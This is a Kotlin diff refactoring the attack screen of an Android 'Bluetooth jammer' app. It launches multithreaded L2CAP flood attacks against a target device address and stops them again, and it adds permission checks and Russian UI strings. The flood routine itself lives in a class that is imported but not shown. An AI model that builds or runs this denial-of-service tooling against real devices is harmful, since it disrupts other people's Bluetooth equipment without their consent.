@@ -1,28 +1,26 @@
 package com.eikarna.bluetoothjammer
 
-import android.annotation.SuppressLint
+import android.Manifest
 import android.bluetooth.BluetoothAdapter
+import android.content.pm.PackageManager
 import android.graphics.text.LineBreaker
 import android.os.Build
 import android.os.Bundle
-import android.util.Log
 import android.widget.Toast
 import androidx.annotation.RequiresApi
+import androidx.annotation.RequiresPermission
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
 import androidx.core.text.isDigitsOnly
 import androidx.core.widget.doAfterTextChanged
-import api.L2capFloodAttack
+import com.eikarna.bluetoothjammer.api.L2capFloodAttack
 import com.google.android.material.button.MaterialButton
 import com.google.android.material.materialswitch.MaterialSwitch
-import com.google.android.material.textview.MaterialTextView
 import com.google.android.material.textfield.TextInputEditText
-import java.util.Date
-import util.Logger
-import kotlin.math.log
+import com.google.android.material.textview.MaterialTextView
 
 class AttackActivity : AppCompatActivity() {
-
-    // Initialize UI elements
+    // UI elements
     private lateinit var viewDeviceName: MaterialTextView
     private lateinit var viewDeviceAddress: MaterialTextView
     private lateinit var viewThreads: TextInputEditText
@@ -30,31 +28,44 @@ class AttackActivity : AppCompatActivity() {
     private lateinit var logAttack: MaterialTextView
     private lateinit var switchLog: MaterialSwitch
 
-    // Initialize detail info
+    // Attack state
     private lateinit var deviceName: String
     private lateinit var address: String
-    private var threads: Int = 1
+    private var threads: Int = DEFAULT_THREAD_COUNT
+    private var activeAttacks = mutableListOf<L2capFloodAttack>()
+    private var bluetoothAdapter: BluetoothAdapter? = null
 
     companion object {
         @JvmStatic
         var isAttacking = false
-        var FrameworkVersion = 1.0
+        const val FrameworkVersion = "1.1"
         var loggingStatus = true
+        private const val DEFAULT_THREAD_COUNT = 1
+        private const val MAX_LOG_LINES = 100
+    }
+
+    @RequiresPermission(Manifest.permission.BLUETOOTH_SCAN)
+    @RequiresApi(Build.VERSION_CODES.O)
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.attack_layout)
+        setupBluetooth()
+        initViews()
+        setupEventListeners()
+        logFrameworkVersion()
+    }
+
+    private fun setupBluetooth() {
+        bluetoothAdapter = BluetoothAdapter.getDefaultAdapter().also {
+            if (it == null) {
+                showToast("Bluetooth не доступен")
+                finish()
+            }
+        }
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
-    override fun onCreate(savedInstanceState: Bundle?) {
-        Log.d("AttackActivity", "onCreate called")
-        println("AttackActivity onCreate called")
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.attack_layout)
-
-        // Get data from Intent
-        deviceName = intent.getStringExtra("DEVICE_NAME") ?: "Unknown Device"
-        address = intent.getStringExtra("ADDRESS") ?: "Unknown Address"
-        threads = intent.getIntExtra("THREADS", 1)
-
-        // Get Element ID
+    private fun initViews() {
         viewDeviceName = findViewById(R.id.textViewDeviceName)
         viewDeviceAddress = findViewById(R.id.textViewAddress)
         viewThreads = findViewById(R.id.editTextThreads)
@@ -62,76 +73,112 @@ class AttackActivity : AppCompatActivity() {
         logAttack = findViewById(R.id.logTextView)
         switchLog = findViewById(R.id.switchLogView)
 
-        // Set text views
-        viewDeviceName.text = "Device Name: $deviceName"
-        viewDeviceAddress.text = "Address: $address"
-        viewThreads.setText("$threads")
+        // Initialize from intent
+        deviceName = intent.getStringExtra("DEVICE_NAME") ?: "Unknown Device"
+        address = intent.getStringExtra("ADDRESS") ?: "Unknown Address"
+        threads = intent.getIntExtra("THREADS", DEFAULT_THREAD_COUNT)
+
+        // Set initial values
+        viewDeviceName.text = "Название: $deviceName"
+        viewDeviceAddress.text = "Адрес: $address"
+        viewThreads.setText(threads.toString())
         logAttack.justificationMode = LineBreaker.JUSTIFICATION_MODE_INTER_WORD
-        Logger.appendLog(logAttack, "Bluetooth Jammer Framework Version: $FrameworkVersion")
+    }
 
-
-
-        // Set button listener
+    @RequiresPermission(Manifest.permission.BLUETOOTH_SCAN)
+    private fun setupEventListeners() {
         buttonStartStop.setOnClickListener {
-            if (isAttacking) {
-                stopAttack()
-            } else {
-                startAttack()
+            if (isAttacking) stopAttack() else startAttack()
+        }
+
+        viewThreads.doAfterTextChanged { text ->
+            text?.toString()?.takeIf { it.isNotEmpty() && it.isDigitsOnly() }?.let {
+                threads = it.toInt().coerceAtLeast(1)
             }
         }
 
-        // Threading Input listener
-        viewThreads.doAfterTextChanged { str ->
-            if (str != null) {
-                if (str.toString() != "" && str.isDigitsOnly()) {
-                    threads = str.toString().toInt()
-                }
-            }
-        }
-
-        // Logging Switch listener
         switchLog.setOnCheckedChangeListener { _, isChecked ->
-            if (isChecked) {
-                loggingStatus = true
-                Toast.makeText(this@AttackActivity, "Logging Enabled! You may degrade performance issue.", Toast.LENGTH_LONG).show()
-            } else {
-                loggingStatus = false
-                Toast.makeText(this@AttackActivity, "Logging Disabled!", Toast.LENGTH_LONG).show()
+            loggingStatus = isChecked
+            showToast(if (isChecked) "Логирование включено" else "Логирование выключено")
+        }
+    }
+
+    private fun logFrameworkVersion() {
+        appendLog("Bluetooth Jammer v$FrameworkVersion")
+    }
+
+    @RequiresPermission(Manifest.permission.BLUETOOTH_SCAN)
+    private fun startAttack() {
+        if (!checkBluetoothPermissions()) {
+            showToast("Bluetooth permissions required!")
+            return
+        }
+
+        isAttacking = true
+        buttonStartStop.text = "Стоп"
+        bluetoothAdapter?.cancelDiscovery()
+        activeAttacks.clear()
+
+        appendLog("Attack started on $deviceName ($address) with $threads threads")
+        showToast("Attack running - use STOP button to end")
+
+        repeat(threads) {
+            L2capFloodAttack(address).apply {
+                startAttack(this@AttackActivity, logAttack)
+                activeAttacks.add(this)
             }
         }
     }
 
-    @RequiresApi(Build.VERSION_CODES.Q)
-    @SuppressLint("MissingPermission")
-    private fun startAttack() {
-        isAttacking = true
-        buttonStartStop.text = "Stop"
-        BluetoothAdapter.getDefaultAdapter().cancelDiscovery()
-        Logger.appendLog(logAttack, "Attack Started! Address: $address ($deviceName) | Threads: $threads")
-        Toast.makeText(this@AttackActivity, "PLEASE FORCE CLOSE APP IF YOU WANT STOP THE ATTACK!", Toast.LENGTH_LONG).show()
-        for (i in 1..threads) L2capFloodAttack(address).startAttack(this, logAttack)
-    }
-
-    @SuppressLint("MissingPermission")
+    @RequiresPermission(Manifest.permission.BLUETOOTH_SCAN)
     private fun stopAttack() {
         isAttacking = false
-        buttonStartStop.text = "Start"
-        Logger.appendLog(logAttack, "Attack Stopped! Force close this app..")
-        BluetoothAdapter.getDefaultAdapter().startDiscovery()
-        L2capFloodAttack(address).stopAttack()
+        buttonStartStop.text = "Старт"
+
+        activeAttacks.forEach { it.stopAttack() }
+        activeAttacks.clear()
+
+        bluetoothAdapter?.startDiscovery()
+        appendLog("Атака была остановлена")
     }
 
+    private fun appendLog(message: String) {
+        if (!loggingStatus) return
+
+        runOnUiThread {
+            val currentLogs = logAttack.text.toString()
+            val newLogs = if (currentLogs.isEmpty()) message else "$currentLogs\n$message"
+
+            // Limit log size
+            val lines = newLogs.split('\n')
+            logAttack.text = if (lines.size > MAX_LOG_LINES) {
+                lines.takeLast(MAX_LOG_LINES).joinToString("\n")
+            } else {
+                newLogs
+            }
+        }
+    }
+
+    private fun checkBluetoothPermissions(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.BLUETOOTH_CONNECT
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun showToast(message: String, duration: Int = Toast.LENGTH_SHORT) {
+        Toast.makeText(this, message, duration).show()
+    }
+
+    @RequiresPermission(Manifest.permission.BLUETOOTH_SCAN)
     override fun onDestroy() {
+        if (isAttacking) stopAttack()
         super.onDestroy()
-        if (isAttacking) {
-            stopAttack() // Ensure the attack stops if the activity is destroyed
-        }
     }
 
+    @RequiresPermission(Manifest.permission.BLUETOOTH_SCAN)
     override fun onPause() {
+        if (isAttacking) stopAttack()
         super.onPause()
-        if (isAttacking) {
-            stopAttack()
-        }
     }
 }
